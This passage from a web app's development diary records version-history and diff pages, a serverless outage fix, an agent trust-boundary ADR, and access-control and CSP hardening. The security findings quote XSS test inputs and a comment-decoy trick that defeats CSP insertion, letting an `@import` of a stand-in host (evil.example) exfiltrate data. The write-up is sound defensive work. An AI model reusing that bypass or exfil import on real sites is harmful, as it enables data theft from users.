    ADR-002/013's origin isolation. Fixed by stripping every block to plain text (`stripTags`) and
    HTML-escaping it (`escapeHtml`) before ever assembling the output string — the returned `html` never
    contains a byte the caller didn't author. New tests assert a `<script>`, an `onclick=`, and an
    entity-encoded `<img onerror=…>` all come out inert. `label` is always
    `"structural diff unavailable — raw comparison"` (`STRUCTURAL_DIFF_UNAVAILABLE_LABEL`), the exact
    ADR-0065 §3 wording.
  - 24 new tests across `diff.test.ts` (10) and `html-fallback.test.ts` (8, incl. 3 security) plus the
    pre-existing 5 fidelity + auto-wrap/fragments/security/shell tests — `packages/report-html` now 69
    tests, all green.
- **Dashboard pages (`apps/app`)**:
  - `reports.$slug.versions.tsx` — lists versions (version_no, uploaded-at, scan_status, origin badge,
    live badge), "View" (→ `view.<domain>/<slug>?v=N`) and "Compare with previous" actions. **Reality
    check, flagged rather than silently worked around**: the viewer (`apps/view/app/routes/$slug.tsx`)
    has NO `?v=N` handling at all today — it only ever serves the live version — despite ADR-0065 §5
    saying that behavior is "unchanged" (implying it already existed). Out of scope to fix here (`apps/view`
    is off-limits for this slice); the link is built to the documented contract for forward-compatibility,
    with an inline comment explaining it's a no-op on non-live versions until a future `apps/view` slice
    adds the handling.
  - `reports.$slug.diff.tsx?from=N&to=N` — loads both versions' HTML + optional sidecars; structural diff
    when both sides have one, `diffHtmlFallback` (with its label) otherwise. Renders the diff's **body-only**
    fragment inside the dashboard page, deliberately NOT the report's own presentation shell (a full
    standalone document with its own fonts/layout) — new `.report-diff-body`/`.rd-diff-*` rules added to
    `apps/app/app/styles/theme.css` (Forge & Ember tokens, ADR-0058) so both diff modes read as one
    system.
  - **Auth**: both routes share a new tiny helper, `apps/app/app/server/report-versions.server.ts`
    (`loadReportForVersionsRead`) — runs `listReportVersions`'s org-scoped `loadOrgReport` guard FIRST
    (mirroring `GET /api/v1/reports/{slug}/versions` exactly, per the brief), then `getReport` only after
    that succeeds, purely to obtain the full `Report` aggregate (title, and — for the diff route — each
    version's manifest) that the `VersionPage` projection deliberately omits. Documented as safe in the
    helper's own comment: `getReport`'s gate is a strict superset of `loadOrgReport`'s, so calling it
    second can't grant anything the first check didn't already. This is a small app-local read helper, not
    a new `packages/application` use case (per the brief's stated preference).
  - **Entry point**: a new `HistoryIcon` (`components/icons.tsx`) link on each dashboard row
    (`_index.tsx`), next to the existing Open/Edit icons, routing to `/reports/:slug/versions`.
  - **Scope-limiting judgment call**: the versions page shows one page of up to 100 versions (no cursor
    UI) rather than wiring full pagination — ADR-0065 doesn't mandate infinite-scroll on this page, and
    the vast majority of reports have far fewer than 100 versions; `hasMore` is surfaced as a note
    ("showing the 100 most recent") rather than Prev/Next links.
- **No new `/api/v1` route, no OpenAPI change** — both pages compose the existing `listReportVersions`/
  `getReport` use cases server-side (no HTTP self-call), per the brief's explicit preference.
- **e2e**: `tests/e2e/features/review-version-history-and-diff.feature` (`@phase-2 @wip` — matching
  `list-report-versions.feature`'s status; not yet wired into the Playwright run, same as every other
  `tests/e2e/features/**` file per `playwright.config.ts`'s comment) — versions-list happy path,
  structural-diff happy path, fallback-diff happy path, non-owner denial on both routes. Registered in
  `scripts/docs-conformance/config.mjs`. README's `.feature` count corrected 32 → 34 (one file, plus a
  pre-existing off-by-one already on disk before this slice).
- **Not touched, on purpose**: `apps/view`, comments code, `reports.$slug.edit.tsx` (read only, to learn
  its sidecar-reading pattern), `packages/db` migrations (no schema change — the diff is computed on
  demand from two existing R2 objects, per ADR-0065 §3's "no new storage artifact" decision).
- **Gate**: `biome ci .` clean, `turbo typecheck` (12 packages) clean, `vitest run` — 123 files / 806
  tests green, `docs:check` clean.

Worktree: `worktree/visual-diff` (branch `feat/visual-diff`). Not yet merged.

### 2026-07-08 — Development-agent trust boundary (ADR-0069)

Auditing an external AI coding-agent runtime (`obra/lace`, requested as a comparison for our own Claude
Code tooling) surfaced a concrete gap: lace auto-spawns project-scoped MCP servers from a repo-tracked
`.lace/mcp-config.json` with no visible trust prompt — opening a malicious clone could run an
attacker-controlled process with whatever credentials that session held. The audit itself was done safely
by delegating the clone-and-read work to tool-restricted `Explore` subagents with no push/send/deploy
capability, while the privileged orchestrator only ever consumed their already-read-only output — i.e. by
accident, applying the "lethal trifecta" compartmentalization principle (private data + untrusted content
+ external-action capability must not sit in one context) that this repo's own product architecture
already applies to untrusted report HTML (ADR-0045's "isolation > AV", ADR-0062 §9's app-origin trust
boundary).

**ADR-0069** formalizes the same principle for this repo's *development*-agent tooling: classifies
Private / Untrusted / External-action capability legs, requires untrusted-content reads to be delegated to
a tool-restricted subagent whose output is treated as data-not-instructions, requires the privileged
orchestrator not to fetch-and-act on untrusted content in the same step, and pre-emptively requires
explicit user trust before any future project-scoped MCP config auto-spawns servers (none exists in this
repo today). Explicitly scoped as risk reduction, not a guarantee — enforcement is procedural (cited from
`CLAUDE.md`, checked in `/code-review`/`/security-review`), not a runtime hook; hard enforcement was
considered and deferred pending Phase 0e's hook infrastructure. `CLAUDE.md` gained a new "Agent trust
boundary" section pointing to it.

Worktree: `worktree/adr-agent-trust-boundary` (branch `docs/adr-agent-trust-boundary`). Not yet merged.

### 2026-07-08 — PROD DOWN incident: jsdom un-shippable on serverless → linkedom (PRs #163, #167)

After the editing epic's PRs merged, **every `app.centaurspec.com` route 500'd at boot** — surfaced when
the operator hit `/reports/{slug}/open`. Root cause: PR #151 put `arp-report-html` (→ jsdom) into
`apps/app`, and jsdom@29's dependency subtree is repeatedly un-shippable on Vercel's serverless runtime.
Two layers, fixed in sequence:

- **Layer 1 (#163)** — `css-tree` (transitive jsdom dep) `require`s `data/patch.json` at load; the SSR
  bundler was *inlining* jsdom and mangling that relative require, so Vercel never shipped the file →
  `Cannot find module '../data/patch.json'`. Fix mirrored the argon2 precedent (bb1457c): `ssr.external`
  += jsdom, declare it directly in `apps/app`. Correct for layer 1 — but externalizing then exposed…
- **Layer 2 (#167)** — with jsdom loading as real modules, `html-encoding-sniffer@6` (CJS) `require()`s
  the **ESM-only** `@exodus/bytes` → `ERR_REQUIRE_ESM`, crashing every route again. **Decision: stop
  patching jsdom's tree.** `report-html` needs only `createElement` + `innerHTML`; swapped the server DOM
  backend to **linkedom** — serverless-native, no native binaries, data files, or ESM-interop landmines.
  jsdom / css-tree / html-encoding-sniffer / @exodus/bytes are gone from the bundle. Verified against a
  live app preview (`/reports/{slug}/versions` → 302, not 500). The backend note lives in ADR-0062 §3
  (linkedom preserves `style` verbatim — a fidelity improvement; fidelity stays 15/15, no data migration).

Vendor change, per the diary protocol. **Process gaps this exposed (follow-ups filed):** #166 — the
preview smoke only exercises the *view* app, so an app-origin boot crash sailed through CI (add a smoke
on an app route that imports report-html — the exact check that would have caught both layers). #165 —
split report-html's server-only DOM helper so a DOM-backend problem can't crash DOM-free routes like
`/open`. Also this session: Vercel free-tier daily deploy quota (100/day, HTTP 402) blocked CI and prod
recovery repeatedly → upgraded to Pro.

### 2026-07-08 — Viewer ?v=N version serving implemented (issue #155)

ADR-0038 §3 always specified `?v=N` access to non-live versions ("same ACL + same scan-status state
machine as the live URL"), and ADR-0065 §5 / the #156 versions-page "View" links assumed it worked —
but `apps/view/$slug.tsx` never read the param and always served the live version. Closed the gap:

- `parseVersionQuery` (pure): strict `^\d+$`; missing/malformed → absent → serve live (unchanged
  default). Deliberately no 404 on malformed input — avoids a parse-vs-not oracle; out-of-range 0/negative
  is a resolver-layer 404, kept in one place.
- `resolveViewableReport` gains an optional `requestedVersionNo`: resolves the `ReportVersion` with that
  `versionNo` and maps its OWN `scan_status` through the **identical** table the live path uses — clean →
  serve, pending → scanning holding page, flagged → 451, blocked/unknown-N → reason-opaque 404 (no
  version-count leak). Takedown → 410 at any N. The ACL gate (`resolveAccessDecision`) is applied AFTER,
  unchanged — `?v=N` is the same gate on a different version, not a bypass (per ADR-0038 §3's note that the
  ordinal grants nothing beyond the slug capability).
- Headers/CSP/noindex identical to live. No change to the live-serving path when `v` is absent.

Fully TDD (version-query parser + resolver scan-status matrix: clean N, pending→scanning, flagged→451,
blocked→404, out-of-range→404, takedown-at-any-N, non-clean-liveVersionId defense-in-depth) — that unit
matrix is the actual regression net. The pre-existing `view-version-by-ordinal.feature` (registered on
main) is spec-only Gherkin, like every `.feature` in the repo (no step defs under `tests/e2e/steps/` yet)
— living documentation, not executed e2e. No ADR change needed — this makes code match ADR-0038's existing
contract; ADR-0065 §5's "?v=N unchanged" stays accurate (0065 didn't touch it). Fixes the dead "View"
links the #156 version-history page shipped.

### 2026-07-08 — Post-merge dogfood on the ownership epic → viewer gate-order fix

Ran `/ce-dogfood` against live prod after the epic merged (report:
`docs/dogfood-reports/2026-07-08-ownership-epic.md`; 15/16 assertions passed — ownership on the
wire, creator-is-owner, owner-conditional acl, G3 scope denials, viewer/private gates, problem+json
401s all verified live with a created-then-deleted probe report). The one failure: the viewer served
the ADR-0038 §2 `200` "Scanning…" holding page BEFORE the ADR-0056 access decision, so a PRIVATE
report mid-scan revealed its existence and scan state to any slug-holder (a 200-vs-302/404 oracle
during the scan window). ADR-0038's original "intentional leak" rationale assumed slugs are
owner-shared capabilities — true pre-ADR-0056, not since private-by-default.

Fix (`fix/viewer-acl-before-scan`): `ViewOutcome.scanning` now carries the report; the route runs
`resolveAccessDecision` first for both `serve` and `scanning`, and only an admitted visitor (owner
via `/open`, org member, grantee, or anyone for `public`) sees the holding page — everyone else gets
the identical unlock redirect the clean version would give them. `deleted`/`flagged`/`notfound`
(410/451/404) stay pre-gate reason-opaque terminal states (documented contract; the flagged-451
variant of this question is noted in the PR as a deliberate non-change). ADR-0038 gained a dated
amendment section; `sharing-modes.feature` gained the two mid-scan scenarios (spec-only Gherkin,
like the rest). Dogfood observations logged, no action: `reports_list_write_grants` (a read) sits
behind `acl:write`; the app origin serves no CSP (viewer-only header stack is per ADR-013); `/open`
drops the deep link for signed-out owners (deliberate anti-oracle collapse).

Worktree: `worktree/viewer-acl-before-scan` (branch `fix/viewer-acl-before-scan`). Not yet merged.

### 2026-07-08 — Editor MVP dogfood fixes: shell CSS, comment highlights, inline-content structure

Operator dogfooded the PR #151 editor MVP and found it poor on three counts, all root-caused and fixed
in one pass (`worktree/editor-styling-fix`, branch `feat/editor-styling-fix`):

1. **Lost styling (dominant defect).** `reports.$slug.edit.tsx`'s loader called `splitShell(html)` and
   discarded the `shell` half — the report's own `<style>` never reached the client, and
   `ReportEditor.tsx` mounted `EditorView` into a bare `<div class="report-editor prose …">` with no CSS
   backing either class. Every bespoke class (chips/cards/sections/rt/rd/…) rendered unstyled. Fixed by
   returning `shell` from the loader (save path untouched — the action already re-splits server-side) and
   mounting `EditorView` **inside a same-origin, sandboxed `<iframe>`** built from that shell
   (`apps/app/app/editor/iframe-document.ts`'s `buildIframeDocument`, pure/unit-tested). The iframe's own
   `<body>` — carrying the shell's original classes/attrs — becomes the PM editable root directly via
   `new EditorView({ mount: body }, …)`, so the editing surface now renders with the report's real CSS,
   isolated automatically from the dashboard's own `tailwind.css` in both directions.
2. **Comment highlights invisible.** `comment-decorations.ts` already dispatched
   `Decoration.inline(from, to, { class: "comment-highlight" })`, but no `.comment-highlight` CSS rule
   existed anywhere. Added it to the iframe's injected `<style>` (same document as the decorated spans):
   a translucent brass highlight (`rgba(244,201,93,.28)` background + inset box-shadow), legible on the
   fixture's warm-dark palette.
3. **Structure flattening.** The generic attr-retention catch-all (`content: 'block*'`) folded
   `rt`/`rd`/`rtags`/`chips`/`block-label` into itself and auto-wrapped their bare inline content
   (text/chip spans) in a `<p>` — extra DOM layer, broken flex/gap layouts, shifted selection. Added
   dedicated `content: 'inline*'` node specs for those five (`packages/report-html/src/schema/
   inline-content.ts`) — verified against every fixture occurrence (52× rt/rd/rtags, 25× chips, 14×
   block-label) that none ever holds a nested block element. `role-head` stays on the generic catch-all
   (4/7 occurrences mix inline content with a block `<h3>`); `rmeta` is pure-inline too but was judged out
   of scope for this pass (not named in the fix brief) — left on the catch-all, with a note in the code
   for whoever picks it up next. A CSS safety net (`.rt>p,.rd>p,.rtags>p,.chips>p,.block-label>p{margin:0;
   display:contents}`) covers any residual auto-`<p>` from containers this pass didn't touch.

**Security (ADR-0062 §9 amended, not superseded):** the shell's `<style>` is untrusted uploaded CSS now
actually rendering on the app.<domain> origin (previously discarded, so this exposure is new). The iframe
carries its own `Content-Security-Policy` meta tag — `default-src 'none'; style-src 'self'
'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; base-uri 'none'` — inserted as `<head>`'s
first child, before the report's own `<style>`. `sandbox="allow-same-origin"` (required for the parent to
reach `contentDocument` at all) but deliberately **no** `allow-scripts` — PM's event listeners attach from
the parent's JS context (a same-origin DOM op, not iframe-script execution), and the iframe document never
emits a `<script>` tag. This is a second, independent containment layer on top of (not a replacement for)
the existing schema-is-the-allowlist boundary §9 already documents.

Round-trip fidelity suite stayed **15/15** (the count-based class-preservation contract doesn't care about
the wrapping-div change); `auto-wrap.test.ts`'s pinned `.chips` case moved to `inline-content.test.ts`
(new behavior) while its `.card` case stays as the accepted-cost contract for genuinely mixed
inline/block containers. Fully TDD: `inline-content.test.ts` (schema), `iframe-document.test.ts` (pure
string-building, unit-tested even though the iframe mount itself is manual/e2e territory per the task
brief). Gates green: biome, typecheck, vitest (1020+ tests), docs:check. Not yet merged.

### 2026-07-08 — Blocker security fix: `buildIframeDocument`'s CSP insertion was regex-foolable

A security review of the fix above (same worktree, `worktree/editor-styling-fix`) found the CSP `<meta>`
insertion itself exploitable: `buildIframeDocument` located `<head>`/`</head>` in `shell.pre` —
**fully attacker-controlled** HTML (`splitShell` only requires a later `<body …>` tag to exist) — with
`HEAD_OPEN_RE = /<head[^>]*>/i` + `shell.pre.lastIndexOf("</head>")`. A shell carrying a decoy
head-shaped string inside an HTML comment (`<!-- decoy <head foo> -->`) fools the regex into matching the
decoy as "the" head-open tag; the CSP meta gets spliced into that dead comment text (inert, never parsed),
while `lastIndexOf("</head>")` still finds the real `</head>` — so the real head, carrying the attacker's
`@import url(https://evil.example/exfil.css)` exfil style, ships with **no CSP at all**. Since the shell's
`<style>` is opaque to `sanitizeStyle` (never schema-governed, ADR-0062 §9), the CSP meta was the *only*
mitigation for that block — and it was defeated.

Fixed (TDD — adversarial test written first, confirmed failing against the regex code, then green after
the fix) by replacing the regex/`indexOf` scan with a real, **comment-aware HTML parser**:
`buildIframeDocument` now parses `shell.pre + shell.post` in full, inserts the CSP `<meta>` as the parsed
`<head>`'s first ELEMENT child (highlight/safety-net `<style>` as its last child), and rebuilds the output
from that `<head>`'s and `<body>`'s own serialized `outerHTML` — never trusting the parser's internal tree
shape (a genuinely headless input can produce a quirky implied-tag placement in some parsers; detected via
`documentElement.tagName !== "HTML"` and routed to the pre-existing synthetic-wrapper fallback, which stays
regex-free and safe regardless since there's no real head to protect in that case).

**Parser choice, and why:** `buildIframeDocument(shell, parseHtml = domParserParse)` takes an injectable
parser. Production (`ReportEditor.tsx`, browser-only — this function is called from a `useMemo` in a
mounted React component) uses the default: the browser's own native `DOMParser` — comment-aware, zero
added client bytes, and (being a lazy default parameter) never referenced under Node. The unit suite
(`iframe-document.test.ts`) injects `linkedom`'s `parseHTML` instead — already a workspace dependency
(`arp-report-html`'s server-side DOM backend, `dom-environment.ts`) and, like `DOMParser`, a real
comment-aware HTML5 parser — so the adversarial tests run under this repo's only unit-test environment
(vitest's plain `node`, per root `vitest.config.ts`; jsdom was removed as un-shippable, happy-dom was never
installed) without adding a new DOM-environment devDependency or a heavier parser to the client bundle.
This mirrors the dependency-injection pattern `dom-environment.ts` already uses (`typeof document !==
"undefined" ? document : parseHTML(...)`), just inverted (browser-native default, test-injected fallback).

**Secondary hardening in the same fix:** dropped `'self'` from `style-src`/`img-src` — reports are
self-contained (verified: zero `url(...)`/`@import` occurrences of any kind in the
`ai-readiness-report.html` fixture), so `'self'` only ever bought a same-origin, cookie-bearing
request-forgery surface against the app.<domain> origin, never a legitimate report asset. New CSP:
`default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; base-uri 'none'`.
`'unsafe-inline'`/`data:` stay (needed for the report's own inline `<style>` and any inlined images/fonts).

Scope note: this re-parse is the **editor's render surface only**. The saved artifact still round-trips
through `reinjectShell`'s byte-exact string concatenation (`packages/report-html/src/shell.ts`), which this
fix does not touch.

`docs/adr/0062-editing-model-report-html-schema.md` §9 gained "Amendment 2" documenting the parser fix and
the CSP tightening. Gates green: `pnpm install`, `biome ci .` (clean save one pre-existing, unrelated
fixture CSS-specificity warning), `turbo typecheck`, `vitest run` (1023 tests, 135 files), `docs:check`.
Not yet merged.
